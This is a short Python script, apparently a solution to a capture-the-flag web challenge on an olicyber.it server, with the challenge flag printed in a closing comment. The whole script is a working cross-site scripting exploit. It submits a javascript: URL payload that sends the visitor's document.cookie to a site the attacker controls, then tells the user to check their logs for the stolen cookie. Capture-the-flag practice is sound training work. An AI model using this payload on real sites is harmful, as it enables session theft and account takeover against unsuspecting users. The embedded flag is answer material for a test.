#!/usr/bin/env python3
import requests

SITE = "http://proposte.challs.olicyber.it/"
MYSITE = input("Enter the site: ")
PAYLOAD = f"javascript:window.location.href='{MYSITE}/?'+document.cookie + ''"
requests.post(SITE + 'altro', data={'text':'idk but it seems good enough', 'url': PAYLOAD})
print("Check your site logs") # flag{n0rm4l(ize)_I5_b4d}
